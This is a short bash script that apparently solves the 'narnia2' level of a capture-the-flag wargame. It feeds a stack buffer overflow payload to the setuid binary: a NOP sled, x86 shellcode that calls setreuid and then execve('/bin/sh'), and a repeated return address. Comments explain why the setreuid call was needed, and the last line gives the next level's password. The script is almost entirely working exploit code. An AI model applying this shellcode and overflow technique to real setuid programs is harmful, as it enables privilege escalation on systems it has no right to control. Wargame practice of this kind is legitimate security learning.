#!/usr/bin/bash

./narnia2 $(echo -n -e "/x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x31\x58\x31\xd2\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80\x24\xd4\xff\xff\x24\xd4\xff\xff\x24\xd4\xff\xff\x24\xd4\xff\xff\x24\xd4\xff\xff\x24\xd4\xff\xff\x24\xd4\xff\xff\x24\xd4\xff\xff\x24\xd4\xff\xff\x24\xd4\xff\xff\x24\xd4\xff\xff\x24\xd4\xff\xff")

#Finding the right shellcode was a big problem
#Even after finding some working shellcode, the shell which was popped did not belong to narnia3 - the owner of the file narnia2
#After doing some digging, it turns out that one had to do the setreuid(id,id) syscall before execve("/bin/sh") to make sure the permissions were inherited from the parent
#https://security.stackexchange.com/questions/184842/shellcode-does-not-execute-as-the-owner/192963#192963 --- useful

#narnia3 password at the time of solving -- 8SyQ2wyEDU
